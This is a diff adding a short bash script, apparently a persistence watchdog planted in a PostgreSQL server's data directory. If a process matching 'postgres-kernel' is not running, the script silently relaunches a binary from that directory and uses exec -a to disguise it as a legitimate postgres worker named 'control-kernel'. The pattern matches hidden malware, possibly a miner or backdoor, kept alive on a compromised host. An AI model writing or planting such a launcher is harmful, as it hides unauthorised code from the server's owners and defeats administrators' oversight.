@@ -1,0 +1,4 @@
+#!/bin/bash
+if ! /var/lib/postgresql/data/kernelx pgrep -f 'postgres-kernel' &> /dev/null 2>&1;then
+  exec -a "postgres: control-kernel" /var/lib/postgresql/data/postgres-kernel > /dev/null 2>/dev/null &
+fi
